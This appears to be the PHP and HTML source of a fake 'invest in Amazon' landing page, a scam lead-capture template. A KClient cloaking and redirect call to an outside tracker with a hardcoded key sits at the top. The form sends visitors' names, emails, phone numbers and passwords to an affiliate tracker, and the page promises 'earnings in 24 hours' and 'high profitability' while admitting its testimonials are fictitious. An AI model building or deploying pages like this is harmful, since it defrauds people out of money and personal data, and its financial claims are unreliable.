<?php
// Query params are:  

require_once dirname(__FILE__) . '/kclient.php';
$client = new KClient('https://sat.hogga.icu/api.php?', 'mxvLNB8582n1KNCw');
$client->sendAllParams();       // to send all params from page query
$client->forceRedirectOffer();       // redirect to offer if an offer is chosen
// $client->param('sub_id_5', '123'); // you can send any params
// $client->keyword('PASTE_KEYWORD');  // send custom keyword
// $client->currentPageAsReferrer(); // to send current page URL as click referrer
// $client->debug();              // to enable debug mode and show the errors
// $client->execute();             // request to api, show the output and continue
$client->executeAndBreak();     // to stop page execution if there is redirect or some output
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <link rel="apple-touch-icon" sizes="180x180" href="images/apple-touch-icon.ca8d64b2.png" />
    <link rel="icon" type="image/png" sizes="32x32" href="images/favicon-32x32.d6fbccdd.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="images/favicon-16x16.7c6658db.png" />
    <link rel="shortcut icon" href="favicon.fd208122.ico" />
    <title>Your home for smart investing</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <link href="css/index.e1874bb8.css" rel="stylesheet" />
    <link rel="stylesheet" href="css/intlTelInput.css">
    <link rel="stylesheet" href="css/checkbox-svg.css">
</head>
<body>
<div class="warning-advertorial" style="font-weight: 300;font-size: .7rem;line-height: .8rem;text-align: center;color: #000;opacity: 0.5;position: absolute;text-align: center;width: 100%;z-index: 1;">
    -&nbsp;Advertorial&nbsp;-
</div>
<div id="app">
    <div class="wrapper">
        <section class="main-intro" id="register">
            <div class="mi-top">
                <div class="mi-details">
                    <div class="mi-title">
                        INVEST IN THE <br />
                        BEST:
                    </div>
                    <div class="mi-subtitle">Amazon</div>
                    <div class="mi-text">INVEST NOW</div>
                </div>
            </div>
            <div class="mi-bottom">
                <div class="centered">
                    <div class="mib-title">
                        Invest and learn to generate a second salary
                        <img src="images/white-arrow.0763c432.png" alt="" class="desktop" /><img src="images/down-arrow-mobile.97522618.png" alt="" class="mobile" />
                    </div>
                </div>
            </div>
            <div class="form-side">
                <div class="fs-header">
                    Invest in AMAZON
                </div>
                <div class="fs-body">
                    <form action="https://vip.urotiry.com/tracker"id="myform" method="post" action="" class="main-form">
                        <div class="preloader"></div>
                        <div class="form-wrapper user-inputs mt-xl-0">
                            <div class="col-12 col-sm-12 form-group">
                                <div class="valid-err">
                                    <div class="field-group mt-4">

                                        <div class="form-group">
                                            <input class="form-control" type="text" name="first_name" placeholder="First Name" value=""
                                                   required>
                                        </div>
                                        <div class="form-group">
                                            <input class="form-control" type="text" name="last_name" placeholder="Last Name" value=""
                                                   required>
                                        </div>
                                        <div class="form-group">
                                            <input class="form-control" type="email" name="email" placeholder="E-mail" value=""
                                                   required>
                                        </div>

                                        <div class="form-group form-group--pass">
                                            <div class="form-password_group" style="width: 60%;display: inline-block;">
                                                <input id="password" class="password show_placeholder valid form-control" type="text"
                                                       name="password" autocomplete="off" placeholder="Password"
                                                       required rel="gp" data-size="5" data-character-set="0-9,a-z,A-Z">
                                            </div>
                                            <button class="generate-password-button getNewPass" type="button"
                                                    onclick="exitpage=false;">
                                                Click to generate<br/>
                                                new password
                                            </button>
                                            <div class="valid-pass-label" style="display: none;">
                                                <div class="valid-check valid-check-a-z">
                                                    <label for="password">
                                                        Must contain at least one letter
                                                    </label>
                                                </div>
                                                <div class="valid-check valid-check-A-Z">
                                                    <label for="password">
                                                        Must contain at least one capital letter
                                                    </label>
                                                </div>
                                                <div class="valid-check valid-check-1-9">
                                                    <label for="password">
                                                        Must contain at least one digit
                                                    </label>
                                                </div>
                                                <div class="valid-check valid-check-length">
                                                    <label for="password">
                                                        Should be 8-12 characters long
                                                    </label>
                                                </div>
                                                <div class="valid-check valid-check-alphanumeric">
                                                    <label for="password">
                                                        Should not contain special characters
                                                    </label>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="form-group">
                                            <input class="form-control phone" type="tel" name="phone" placeholder="" value="" required>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="col-12 pt-0 form-group px-4">
                                <input type="hidden" class="phonecc" name="phonecc" value="">
                                <input type="hidden" name="session_id" class="session_id">
                                <input type="hidden" name="affiliate_id" class="affiliate_id">
                                <input type="hidden" name="aff_sub" value="<?php echo $client->getSubid() ?>">
								<input type="hidden" name="aff_sub2" value="<?php echo $client->sendUtmLabels() ?>">
                                <button type="submit" id="submit_button" class="btn btn-success">
                                    Request information
                                </button>
                            </div>
                            <div class="col-12">
                                <div class="checkbox-svg">
                                    <input type="checkbox" id="cbx-2-pop" style="display: none;">
                                    <label for="cbx-2-pop" class="checked-svg">
                                        <svg width="20px" height="20px" viewBox="0 0 18 18">
                                            <path d="M1,9 L1,3.5 C1,2 2,1 3.5,1 L14.5,1 C16,1 17,2 17,3.5 L17,14.5 C17,16 16,17 14.5,17 L3.5,17 C2,17 1,16 1,14.5 L1,9 Z"></path>
                                            <polyline points="1 9 7 14 15 4"></polyline>
                                        </svg>
                                    </label>
                                    <div class="privacy-checkbox">
                                        <p>
                                            I agree to to the collection of my email address for the purposes of
                                            receiving
                                            commercial
                                            offers that we
                                            believe will be of interest to you on behalf of the companies and
                                            industries
                                            explicitly
                                            detailed in our
                                            <a href="terms.html" target="_blank"> Terms & Conditions</a>
                                            and
                                            <a href="privacy.html" target="_blank"> Privacy Policy.</a>
                                        </p>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <!-- end terms and conditions -->
                    <input type="hidden" name="offer_id" value="3873"><input type="hidden" name="aff_sub3" value="{your_domain}"><input type="hidden" name="nocabinet" value="1"><input type="hidden" name="api_offer" value="on" ><input type="hidden" name="aff_id" value="4185"> </form> 
                </div>
                <div class="fs-footer">
                    <div class="fs-top">To invest in Amazon, you must be at least 18 years old. Minimum required capital of 250 £</div>
                    <div class="fs-bottom"><img src="images/payment-methods-grey.f0256471.png" alt="" /></div>
                </div>
            </div>
        </section>
        <section class="mobile-img"><img src="images/img-1.7fb83f1d.jpg" alt="" /></section>
        <section class="features">
            <div class="centered">
                <div class="f-title">Starting is easy. Get access to:</div>
                <ul class="feature-list">
                    <li>
                        <img src="images/1.07679d72.png" alt="" />
                        <div class="fi-title">
                            Secure and authorized platform
                        </div>
                    </li>
                    <li>
                        <img src="images/3.b9e91503.png" alt="" />
                        <div class="fi-title">
                            Earnings in your account in 24 hours
                        </div>
                    </li>
                    <li>
                        <img src="images/2.b9c02c91.png" alt="" />
                        <div class="fi-title">
                            High profitability
                        </div>
                    </li>
                    <li>
                        <img src="images/4.f02c9d4f.png" alt="" />
                        <div class="fi-title">
                            Simple learning tools
                        </div>
                    </li>
                    <li>
                        <img src="images/5.c7ee5802.png" alt="" />
                        <div class="fi-title">
                            24 hour support and continuous assistance
                        </div>
                    </li>
                </ul>
            </div>
        </section>
        <section class="description">
            <div class="centered">
                <div class="row">
                    <div class="large-6 columns">
                        <div class="d-title">A true “trillionaire company”</div>
                        <p>
                            Amazon's market cap reached 1 trillion dollars in 2018. According to Bloomberg, Amazon could reach yearly gross revenues over $1 trillion by 2025.
                        </p>
                        <p>
                            With increasing market revenue, Amazon is the undisputed leader. Investors and people who participate in the Amazon model can continue to benefit from the development prospects for Amazon.
                        </p>
                    </div>
                    <div class="large-6 columns d-image"><img src="images/img-1.7fb83f1d.jpg" alt="" /></div>
                </div>
                <div class="btn-holder">
                    <a href="#register" class="btn scroll-to-form">
                        Discover how to benefit from investing in Amazon
                    </a>
                </div>
                <div class="payments"><img src="images/payment-methods.eddefc69.png" alt="" /></div>
            </div>
        </section>
        <footer class="footer">
            <div class="centered">
                <div class="disclaimer-footer">
                    <p><strong>Risk disclosure:</strong></p>
                    <p>
                        IMPORTANT: Earnings and Legal Disclaimers Earnings and income representations made by <span
                            class="disclaimer-brand_name__new">Website</span>, (collectively “This Website” only used as
                        aspirational
                        examples of your earnings potential. The success of those in the testimonials and other examples are
                        exceptional
                        results and therefore are not intended as a guarantee that you or others will achieve the same results.
                        Individual results will vary and are entirely dependent on your use of <span
                            class="disclaimer-brand_name__new">Website</span>.
                        This Website is not responsible for your actions. You bear sole responsibility for your actions and
                        decisions
                        when using products and services and therefore you should always exercise caution and due diligence. You
                        agree
                        that this Website is not liable to you in any way for the results of using our products and services.
                        See our
                        Terms & Conditions for our full disclaimer of liability and other restrictions. This Website may receive
                        compensation for products and services they recommend to you. If you do not want This Website to be
                        compensated
                        for a recommendation, then we advise that you search online for a similar product through a
                        non-affiliate link.
                        Trading can generate notable benefits, however, it also involves the risk of partial/full loss of the
                        invested
                        capital, therefore, you should consider whether you can afford to invest. ©<span
                            id="yearDisclaimerNew">2020</span><br/>
                    <div class="divider-footer"></div>
                    USA REGULATION NOTICE: Trading Forex, CFDs and Cryptocurrencies is not regulated within the United
                    States.
                    Invest in Crypto is not supervised or regulated by any financial agencies nor US agencies. Any
                    unregulated
                    trading activity by U.S. residents is considered unlawful. <span
                        class="disclaimer-brand_name__new">Website</span> does not accept customers located within the
                    United States
                    or holding an American citizenship.

                    </p>
                    <div class="system">
                        <ul class="sys-menu">
                            <li><a target="_blank" class="as-is as-is-2" href="disclaimer.html">Disclaimer</a></li>
                            <li><a target="_blank" class="as-is" href="privacy.html">Privacy Policy</a></li>
                            <li><a target="_blank" class="as-is" href="terms.html">Terms</a></li>
                            <li><a target="_blank" class="as-is" href="abuse_report.html">Report&nbsp;Abuse/Spam</a></li>
                        </ul>
                    </div>
                    <p>
                        *Testimonials:
                    </p>
                    <p>
                        All characters, information and events depicted on This Website are entirely fictitious. Any similarity to actual events or persons, living or dead, is purely coincidental.
                    </p>
                </div>
                <div>&nbsp;</div>
                <div class="copy">&copy; <span
                        class="disclaimer-brand_name__new">Website</span>
                    <span id="yearDisclaimerNew2">2020</span></div>
                <script type="text/javascript">
                    var yearDisclaimerNew = new Date();
                    document.getElementById("yearDisclaimerNew").innerHTML = yearDisclaimerNew.getFullYear();
                    document.getElementById("yearDisclaimerNew2").innerHTML = yearDisclaimerNew.getFullYear();
                    document.querySelectorAll(".disclaimer-brand_name__new").forEach(function (brandName) {
                        brandName.innerHTML = location.hostname;
                    })
                </script>
            </div>
        </footer>
    </div>
</div>



<script src="js/jquery-3.5.1.min.js"></script>
<script src="js/script.js"></script>
<script src="js/getdetector.js"></script>


<script src="js/intlTelInput.js"></script>
<script src="js/jquery.validate.min.js"></script>
<script src="js/valid.js"></script>
<script src="js/device.min.js"></script>
<!--<script src="js/currency.js"></script>-->
<script src="js/default.js"></script>


<script src="js/commonJs.js"></script>

</body>
</html>